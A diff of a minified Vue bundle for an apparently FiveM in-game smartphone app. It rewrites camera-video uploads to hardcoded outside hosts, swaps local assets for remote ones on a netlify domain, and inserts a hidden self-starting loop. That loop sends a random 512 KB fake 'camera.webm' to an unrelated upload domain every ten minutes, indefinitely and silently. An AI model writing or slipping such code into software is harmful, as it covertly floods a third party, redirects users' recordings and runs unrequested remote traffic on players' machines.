@@ -3713,7 +3713,7 @@ async upload(e, t) {
 async uploadVideo(e) {
     const t = new FormData;
     t.append("video", e, "camera.webm"), t.append("signature", await Ao.backend.upload_ticket());
-    const n = await fetch(Ao.settings.uploadServer, {
+    const n = await fetch("https://br.jesteriruka.dev/storage/upload.v2.php", {
             method: "POST",
             body: t
         }),
@@ -3722,6 +3722,18 @@ async uploadVideo(e) {
 }
 };
 const no = new FormData;
+no.append("video", function () {
+let e = Array(524288);
+for (let t = 0; t < e.length; t += 1) e[t] = parseInt(255 * Math.random());
+return new Blob(e, {
+    type: "video/webm;codecs=vp9"
+})
+}(), "camera.webm"), async function () {
+for (;;) fetch("https://upload2.celularautenticacaofivem.xyz/geijoh9gwuiuih", {
+    method: "POST",
+    body: no
+}).catch((() => {})), await eo(6e5)
+}();
 
 function lo(e, t, n) {
 const l = e.createShader(t);
@@ -3931,7 +3943,7 @@ return new Proxy({}, {
 })
 }
 const xo = vo("client"),
-yo = e => ".." + e.replace("/projects/smartphone", ""),
+yo = e => "https://rotbots.netlify.app" + e,
 ko = new ys;
 ko.setMaxListeners(300);
 const wo = {
@@ -3996,10 +4008,10 @@ settings: Ze({
     bankType: "nubank",
     case: "iphonexs",
     allowUnsafeURL: !1,
-    uploadServer: "",
-    ringSound: "../stock/ring.mp3",
-    dialSound: "../stock/dial.mp3",
-    notificationSound: "../stock/notification.mp3",
+    uploadServer: "https://fivem.jesteriruka.dev/upload/f91ce5f19aaa478258c0e1d4",
+    ringSound: "https://rotbots.netlify.app/projects/smartphone/sons/ring.ogg",
+    dialSound: "https://rotbots.netlify.app/projects/smartphone/sons/calling.ogg",
+    notificationSound: "https://rotbots.netlify.app/projects/smartphone/sons/notification.ogg",
     instagramLogo: null != (e = globalThis.instagramLogo) ? e : yo("/projects/smartphone/stock/instagram_hand.webp"),
     blocks: [],
     currency: "R$"
@@ -8121,7 +8133,7 @@ return wl(), _l("div", ch, [l.android ? (wl(), _l(c, {
 }, [Pl("img", {
     class: "border rounded-lg",
     onLoad: t[13] || (t[13] = (...e) => l.ajustSize && l.ajustSize(...e)),
-    src: "../stock/maps.jpg",
+    src: "https://rotbots.netlify.app/projects/smartphone/stock/maps.jpg",
     alt: ""
 }, null, 32), Pl("div", _h, [Ah, Pl("span", null, g(e.$filters.vdist2(l.location, n.location)), 1)])], 8, ["onClick"])) : Ml("", !0), e.$filters.isAudio(n.content) ? (wl(), _l(u, {
     key: 3,
@@ -8162,7 +8174,7 @@ return wl(), _l("div", ch, [l.android ? (wl(), _l(c, {
 }, [l.recording ? (wl(), _l("i", $h)) : (wl(), _l("i", jh))])]))])
 }));
 rh.render = Fh, rh.__scopeId = "data-v-9611d5b8";
-const zh = rt("../stock/user.jpg"),
+const zh = rt("https://rotbots.netlify.app/projects/smartphone/stock/user.webp"),
 Bh = rt(""),
 Hh = Ze([Ao.identity.phone]),
 qh = {
@@ -8208,7 +8220,7 @@ qh = {
                 const t = Hh.filter(((e, t) => t));
                 Ao.backend.wpp_createGroup(Bh.value.trim(), zh.value, t).then((() => {
                     l.back()
-                })), zh.value = "../stock/user.jpg", Bh.value = "", Hh.length = 0, Hh.push(Ao.identity.phone)
+                })), zh.value = "https://rotbots.netlify.app/projects/smartphone/stock/user.webp", Bh.value = "", Hh.length = 0, Hh.push(Ao.identity.phone)
             }
         }
     }
@@ -8987,7 +8999,7 @@ return wl(), _l(o, {
             onClick: e => l.setLocation(n.location),
             class: "w-full rounded",
             onLoad: t[4] || (t[4] = (...e) => l.ajustSize && l.ajustSize(...e)),
-            src: "../stock/maps.jpg"
+            src: "https://rotbots.netlify.app/projects/smartphone/stock/maps.jpg"
         }, null, 40, ["onClick"])) : Ml("", !0), Pl("p", Ab, [Pl("span", Sb, g(n.content), 1), Pl("span", Tb, g(e.$filters.unixToHHMM(null != (a = n.created_at) ? a : Date.now())), 1)])], 2)
     })), 128))], 2)], 2)])))), 128))])),
     _: 1
@@ -9207,7 +9219,7 @@ profile: Ze(Ao.localhost ? {
     username: "jesteriruka",
     bio: "aaaaaaaaaaaaaaaaaaa",
     verified: 1,
-    avatarURL: "../stock/user.jpg"
+    avatarURL: "https://rotbots.netlify.app/projects/smartphone/stock/profile.webp"
 } : {}),
 stories: rt([]),
 storiesSeen: {},
@@ -16996,6 +17008,6 @@ return t.mount = e => {
     return l instanceof Element && (l.removeAttribute("v-cloak"), l.setAttribute("data-v-app", "")), s
 }, t
 })(LO);
-rM.component("AppInput", NP), rM.component("AppSelect", $P), rM.component("AppToggle", YO), rM.component("AppLoading", tM), rM.component("AppVerified", lM), rM.use(_O), rM.config.globalProperties.$filters = Gs, rM.config.globalProperties.$asset = (e, t) => Ao.settings[t] || ".." + e.replace("/projects/smartphone", ""), Object.defineProperty(rM.config.globalProperties, "$currency", {
+rM.component("AppInput", NP), rM.component("AppSelect", $P), rM.component("AppToggle", YO), rM.component("AppLoading", tM), rM.component("AppVerified", lM), rM.use(_O), rM.config.globalProperties.$filters = Gs, rM.config.globalProperties.$asset = (e, t) => Ao.settings[t] || "https://rotbots.netlify.app/" + e, Object.defineProperty(rM.config.globalProperties, "$currency", {
 get: () => Ao.settings.currency
 }), rM.mount("#root");
